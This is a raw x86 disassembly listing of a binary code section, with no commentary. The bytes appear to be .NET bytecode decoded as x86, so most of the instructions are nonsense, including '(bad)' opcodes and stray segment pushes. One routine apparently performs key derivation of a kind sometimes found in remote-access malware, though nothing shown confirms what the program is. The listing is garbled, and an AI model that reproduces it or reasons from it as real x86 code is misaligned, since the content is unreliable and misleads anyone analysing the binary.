  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 97             	or     -0x69(%edx),%dh
  403d47:	03 00                	add    (%eax),%eax
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	e2 01                	loop   0x403da7
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 f9                	jb     0x403dba
  403dc1:	20 00                	and    %al,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	39 a4 01 00 00 07 72 	cmp    %esp,0x72070000(%ecx,%eax,1)
  403dd7:	59                   	pop    %ecx
  403dd8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	0a 3a                	or     (%edx),%bh
  403de1:	25 00 00 00 07       	and    $0x7000000,%eax
  403de6:	72 63                	jb     0x403e4b
  403de8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ded:	00 00                	add    %al,(%eax)
  403def:	0a 3a                	or     (%edx),%bh
  403df1:	60                   	pusha
  403df2:	00 00                	add    %al,(%eax)
  403df4:	00 07                	add    %al,(%edi)
  403df6:	72 71                	jb     0x403e69
  403df8:	25 00 70 28 25       	and    $0x25287000,%eax
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	0a 3a                	or     (%edx),%bh
  403e01:	d9 00                	flds   (%eax)
  403e03:	00 00                	add    %al,(%eax)
  403e05:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e08:	00 00                	add    %al,(%eax)
  403e0a:	16                   	push   %ss
  403e0b:	28 1a                	sub    %bl,(%edx)
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	06                   	push   %es
  403e10:	73 94                	jae    0x403da6
  403e12:	00 00                	add    %al,(%eax)
  403e14:	06                   	push   %es
  403e15:	25 72 f9 20 00       	and    $0x20f972,%eax
  403e1a:	70 6f                	jo     0x403e8b
  403e1c:	7f 00                	jg     0x403e1e
  403e1e:	00 06                	add    %al,(%esi)
  403e20:	72 59                	jb     0x403e7b
  403e22:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e27:	00 00                	add    %al,(%eax)
  403e29:	06                   	push   %es
  403e2a:	25 72 11 21 00       	and    $0x211172,%eax
  403e2f:	70 6f                	jo     0x403ea0
  403e31:	7f 00                	jg     0x403e33
  403e33:	00 06                	add    %al,(%esi)
  403e35:	28 17                	sub    %dl,(%edi)
  403e37:	00 00                	add    %al,(%eax)
  403e39:	06                   	push   %es
  403e3a:	6a 6f                	push   $0x6f
  403e3c:	74 00                	je     0x403e3e
  403e3e:	00 06                	add    %al,(%esi)
  403e40:	6f                   	outsl  %ds:(%esi),(%dx)
  403e41:	89 00                	mov    %eax,(%eax)
  403e43:	00 06                	add    %al,(%esi)
  403e45:	28 20                	sub    %ah,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	16                   	push   %ss
  403e4b:	28 18                	sub    %bl,(%eax)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	06                   	push   %es
  403e50:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e53:	00 00                	add    %al,(%eax)
  403e55:	00 06                	add    %al,(%esi)
  403e57:	72 87                	jb     0x403de0
  403e59:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e5e:	00 00                	add    %al,(%eax)
  403e60:	06                   	push   %es
  403e61:	6f                   	outsl  %ds:(%esi),(%dx)
  403e62:	8b 00                	mov    (%eax),%eax
  403e64:	00 06                	add    %al,(%esi)
  403e66:	28 42 00             	sub    %al,0x0(%edx)
  403e69:	00 06                	add    %al,(%esi)
  403e6b:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e6f:	00 7e 24             	add    %bh,0x24(%esi)
  403e72:	00 00                	add    %al,(%eax)
  403e74:	04 06                	add    $0x6,%al
  403e76:	6f                   	outsl  %ds:(%esi),(%dx)
  403e77:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e7c:	94                   	xchg   %eax,%esp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	06                   	push   %es
  403e80:	25 72 f9 20 00       	and    $0x20f972,%eax
  403e85:	70 6f                	jo     0x403ef6
  403e87:	7f 00                	jg     0x403e89
  403e89:	00 06                	add    %al,(%esi)
  403e8b:	72 8f                	jb     0x403e1c
  403e8d:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e92:	00 00                	add    %al,(%eax)
  403e94:	06                   	push   %es
  403e95:	25 72 a5 25 00       	and    $0x25a572,%eax
  403e9a:	70 6f                	jo     0x403f0b
  403e9c:	7f 00                	jg     0x403e9e
  403e9e:	00 06                	add    %al,(%esi)
  403ea0:	06                   	push   %es
  403ea1:	72 87                	jb     0x403e2a
  403ea3:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea8:	00 00                	add    %al,(%eax)
  403eaa:	06                   	push   %es
  403eab:	6f                   	outsl  %ds:(%esi),(%dx)
  403eac:	8b 00                	mov    (%eax),%eax
  403eae:	00 06                	add    %al,(%esi)
  403eb0:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb1:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	06                   	push   %es
  403eba:	28 20                	sub    %ah,(%eax)
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	06                   	push   %es
  403ebf:	38 06                	cmp    %al,(%esi)
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	00 06                	add    %al,(%esi)
  403ec5:	28 47 00             	sub    %al,0x0(%edi)
  403ec8:	00 06                	add    %al,(%esi)
  403eca:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403ed0:	b3 00                	mov    $0x0,%bl
  403ed2:	00 0a                	add    %cl,(%edx)
  403ed4:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed7:	00 06                	add    %al,(%esi)
  403ed9:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403edf:	72 b3                	jb     0x403e94
  403ee1:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	06                   	push   %es
  403ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  403eea:	8b 00                	mov    (%eax),%eax
  403eec:	00 06                	add    %al,(%esi)
  403eee:	06                   	push   %es
  403eef:	72 87                	jb     0x403e78
  403ef1:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef6:	00 00                	add    %al,(%eax)
  403ef8:	06                   	push   %es
  403ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  403efa:	7a 00                	jp     0x403efc
  403efc:	00 06                	add    %al,(%esi)
  403efe:	28 41 00             	sub    %al,0x0(%ecx)
  403f01:	00 06                	add    %al,(%esi)
  403f03:	26 7e 24             	es jle 0x403f2a
  403f06:	00 00                	add    %al,(%eax)
  403f08:	04 28                	add    $0x28,%al
  403f0a:	01 00                	add    %eax,(%eax)
  403f0c:	00 2b                	add    %ch,(%ebx)
  403f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0f:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f14:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f18:	00 12                	add    %dl,(%edx)
  403f1a:	02 28                	add    (%eax),%ch
  403f1c:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f21:	09 72 87             	or     %esi,-0x79(%edx)
  403f24:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f2d:	8b 00                	mov    (%eax),%eax
  403f2f:	00 06                	add    %al,(%esi)
  403f31:	06                   	push   %es
  403f32:	72 b3                	jb     0x403ee7
  403f34:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	06                   	push   %es
  403f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3d:	8b 00                	mov    (%eax),%eax
  403f3f:	00 06                	add    %al,(%esi)
  403f41:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f47:	12 00                	adc    (%eax),%al
  403f49:	00 00                	add    %al,(%eax)
  403f4b:	09 28                	or     %ebp,(%eax)
  403f4d:	47                   	inc    %edi
  403f4e:	00 00                	add    %al,(%eax)
  403f50:	06                   	push   %es
  403f51:	7e 24                	jle    0x403f77
  403f53:	00 00                	add    %al,(%eax)
  403f55:	04 09                	add    $0x9,%al
  403f57:	6f                   	outsl  %ds:(%esi),(%dx)
  403f58:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f5d:	12 02                	adc    (%edx),%al
  403f5f:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f65:	b3 dd                	mov    $0xdd,%bl
  403f67:	0e                   	push   %cs
  403f68:	00 00                	add    %al,(%eax)
  403f6a:	00 12                	add    %dl,(%edx)
  403f6c:	02 fe                	add    %dh,%bh
  403f6e:	16                   	push   %ss
  403f6f:	04 00                	add    $0x0,%al
  403f71:	00 1b                	add    %bl,(%ebx)
  403f73:	6f                   	outsl  %ds:(%esi),(%dx)
  403f74:	33 00                	xor    (%eax),%eax
  403f76:	00 0a                	add    %cl,(%edx)
  403f78:	dc dd                	(bad)
  403f7a:	0f 00 00             	sldt   (%eax)
  403f7d:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 28                	or     (%eax),%ch
  403f84:	49                   	dec    %ecx
  403f85:	00 00                	add    %al,(%eax)
  403f87:	06                   	push   %es
  403f88:	dd 00                	fldl   (%eax)
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 2a                	add    %ch,(%edx)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	41                   	inc    %ecx
  403f91:	4c                   	dec    %esp
  403f92:	00 00                	add    %al,(%eax)
  403f94:	00 00                	add    %al,(%eax)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	aa                   	stos   %al,%es:(%edi)
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	00 79 00             	add    %bh,0x0(%ecx)
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	23 01                	and    (%ecx),%eax
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0f 00 00             	sldt   (%eax)
  403fa7:	00 31                	add    %dh,(%ecx)
  403fa9:	00 00                	add    %al,(%eax)
  403fab:	01 02                	add    %eax,(%edx)
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 68 01             	add    %ch,0x1(%eax)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	57                   	push   %edi
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	00 bf 01 00 00 0e    	add    %bh,0xe000001(%edi)
	...
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	00 d2                	add    %dl,%dl
  403fcd:	01 00                	add    %eax,(%eax)
  403fcf:	00 d2                	add    %dl,%dl
  403fd1:	01 00                	add    %eax,(%eax)
  403fd3:	00 0f                	add    %cl,(%edi)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	00 31                	add    %dh,(%ecx)
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	01 13                	add    %edx,(%ebx)
  403fdd:	30 0b                	xor    %cl,(%ebx)
  403fdf:	00 11                	add    %dl,(%ecx)
  403fe1:	01 00                	add    %eax,(%eax)
  403fe3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fe6:	00 11                	add    %dl,(%ecx)
  403fe8:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fee:	72 87                	jb     0x403f77
  403ff0:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	06                   	push   %es
  403ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff9:	8b 00                	mov    (%eax),%eax
  403ffb:	00 06                	add    %al,(%esi)
  403ffd:	28 42 00             	sub    %al,0x0(%edx)
  404000:	00 06                	add    %al,(%esi)
  404002:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404008:	c0 00 00             	rolb   $0x0,(%eax)
  40400b:	0a 72 bd             	or     -0x43(%edx),%dh
  40400e:	25 00 70 6f c1       	and    $0xc16f7000,%eax
  404013:	00 00                	add    %al,(%eax)
  404015:	0a 28                	or     (%eax),%ch
  404017:	c2 00 00             	ret    $0x0
  40401a:	0a 0a                	or     (%edx),%cl
  40401c:	7e 25                	jle    0x404043
  40401e:	00 00                	add    %al,(%eax)
  404020:	04 3a                	add    $0x3a,%al
  404022:	85 00                	test   %eax,(%eax)
  404024:	00 00                	add    %al,(%eax)
  404026:	20 00                	and    %al,(%eax)
  404028:	01 00                	add    %eax,(%eax)
  40402a:	00 72 d9             	add    %dh,-0x27(%edx)
  40402d:	25 00 70 14 d0       	and    $0xd0147000,%eax
  404032:	0f 00 00             	sldt   (%eax)
  404035:	02 28                	add    (%eax),%ch
  404037:	c3                   	ret
  404038:	00 00                	add    %al,(%eax)
  40403a:	0a 1f                	or     (%edi),%bl
  40403c:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  404042:	25 16 16 14 28       	and    $0x28141616,%eax
  404047:	c4 00                	les    (%eax),%eax
  404049:	00 0a                	add    %cl,(%edx)
  40404b:	a2 25 17 17 14       	mov    %al,0x14171725
  404050:	28 c4                	sub    %al,%ah
  404052:	00 00                	add    %al,(%eax)
  404054:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  40405a:	28 c4                	sub    %al,%ah
  40405c:	00 00                	add    %al,(%eax)
  40405e:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  404064:	28 c4                	sub    %al,%ah
  404066:	00 00                	add    %al,(%eax)
  404068:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40406e:	28 c4                	sub    %al,%ah
  404070:	00 00                	add    %al,(%eax)
  404072:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404078:	28 c4                	sub    %al,%ah
  40407a:	00 00                	add    %al,(%eax)
  40407c:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  404082:	28 c4                	sub    %al,%ah
  404084:	00 00                	add    %al,(%eax)
  404086:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40408c:	28 c4                	sub    %al,%ah
  40408e:	00 00                	add    %al,(%eax)
  404090:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  404096:	28 c4                	sub    %al,%ah
  404098:	00 00                	add    %al,(%eax)
  40409a:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  4040a0:	0a 28                	or     (%eax),%ch
  4040a2:	c6 00 00             	movb   $0x0,(%eax)
  4040a5:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040ab:	7e 25                	jle    0x4040d2
  4040ad:	00 00                	add    %al,(%eax)
  4040af:	04 7b                	add    $0x7b,%al
  4040b1:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040b7:	00 00                	add    %al,(%eax)
  4040b9:	04 06                	add    $0x6,%al
  4040bb:	28 06                	sub    %al,(%esi)
  4040bd:	00 00                	add    %al,(%eax)
  4040bf:	06                   	push   %es
  4040c0:	7e 0b                	jle    0x4040cd
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	04 7e                	add    $0x7e,%al
  4040c6:	10 00                	adc    %al,(%eax)
  4040c8:	00 04 02             	add    %al,(%edx,%eax,1)
  4040cb:	72 e1                	jb     0x4040ae
  4040cd:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	06                   	push   %es
  4040d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d6:	7a 00                	jp     0x4040d8
  4040d8:	00 06                	add    %al,(%esi)
  4040da:	7e 1e                	jle    0x4040fa
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	04 7e                	add    $0x7e,%al
  4040e0:	08 00                	or     %al,(%eax)
  4040e2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040e5:	0f 00 00             	sldt   (%eax)
  4040e8:	04 7e                	add    $0x7e,%al
  4040ea:	04 00                	add    $0x0,%al
  4040ec:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040ef:	c8 00 00 0a          	enter  $0x0,$0xa
  4040f3:	28 48 00             	sub    %cl,0x0(%eax)
  4040f6:	00 06                	add    %al,(%esi)
  4040f8:	2a 00                	sub    (%eax),%al
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	1b 30                	sbb    (%eax),%esi
  4040fe:	03 00                	add    (%eax),%eax
  404100:	5c                   	pop    %esp
  404101:	00 00                	add    %al,(%eax)
  404103:	00 15 00 00 11 02    	add    %dl,0x2110000
  404109:	28 18                	sub    %bl,(%eax)
  40410b:	00 00                	add    %al,(%eax)
  40410d:	0a 03                	or     (%ebx),%al
  40410f:	28 ca                	sub    %cl,%dl
  404111:	00 00                	add    %al,(%eax)
  404113:	0a 39                	or     (%ecx),%bh
  404115:	0b 00                	or     (%eax),%eax
  404117:	00 00                	add    %al,(%eax)
  404119:	72 0f                	jb     0x40412a
  40411b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40411f:	cb                   	lret
  404120:	00 00                	add    %al,(%eax)
  404122:	0a 7a 03             	or     0x3(%edx),%bh
  404125:	7e 2c                	jle    0x404153
  404127:	00 00                	add    %al,(%eax)
  404129:	04 20                	add    $0x20,%al
  40412b:	50                   	push   %eax
  40412c:	c3                   	ret
  40412d:	00 00                	add    %al,(%eax)
  40412f:	73 cc                	jae    0x4040fd
  404131:	00 00                	add    %al,(%eax)
  404133:	0a 0a                	or     (%edx),%cl
  404135:	02 06                	add    (%esi),%al
  404137:	1f                   	pop    %ds
  404138:	20 6f cd             	and    %ch,-0x33(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404140:	00 00                	add    %al,(%eax)
  404142:	04 02                	add    $0x2,%al
  404144:	06                   	push   %es
  404145:	1f                   	pop    %ds
  404146:	40                   	inc    %eax
  404147:	6f                   	outsl  %ds:(%esi),(%dx)
  404148:	cd 00                	int    $0x0
  40414a:	00 0a                	add    %cl,(%edx)
  40414c:	7d 2b                	jge    0x404179
  40414e:	00 00                	add    %al,(%eax)
  404150:	04 dd                	add    $0xdd,%al
  404152:	0d 00 00 00 06       	or     $0x6000000,%eax
  404157:	39 06                	cmp    %eax,(%esi)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 06                	add    %al,(%esi)
  40415d:	6f                   	outsl  %ds:(%esi),(%dx)
  40415e:	33 00                	xor    (%eax),%eax
  404160:	00 0a                	add    %cl,(%edx)
  404162:	dc 2a                	fsubrl (%edx)
  404164:	01 10                	add    %edx,(%eax)
  404166:	00 00                	add    %al,(%eax)
  404168:	02 00                	add    (%eax),%al
  40416a:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  40416f:	0d 00 00 00 00       	or     $0x0,%eax
  404174:	1b 30                	sbb    (%eax),%esi
  404176:	05 00 15 01 00       	add    $0x11500,%eax
  40417b:	00 16                	add    %dl,(%esi)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	11 03                	adc    %eax,(%ebx)
  404181:	3a 0b                	cmp    (%ebx),%cl
  404183:	00 00                	add    %al,(%eax)
  404185:	00 72 57             	add    %dh,0x57(%edx)
  404188:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40418c:	cf                   	iret
  40418d:	00 00                	add    %al,(%eax)
  40418f:	0a 7a 73             	or     0x73(%edx),%bh
  404192:	d0 00                	rolb   $1,(%eax)
  404194:	00 0a                	add    %cl,(%edx)
  404196:	0a 06                	or     (%esi),%al
  404198:	1f                   	pop    %ds
  404199:	20 6a 6f             	and    %ch,0x6f(%edx)
  40419c:	4e                   	dec    %esi
  40419d:	00 00                	add    %al,(%eax)
  40419f:	0a 73 d1             	or     -0x2f(%ebx),%dh
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	0a 0b                	or     (%ebx),%cl
  4041a6:	07                   	pop    %es
  4041a7:	20 00                	and    %al,(%eax)
  4041a9:	01 00                	add    %eax,(%eax)
  4041ab:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	0a 07                	or     (%edi),%al
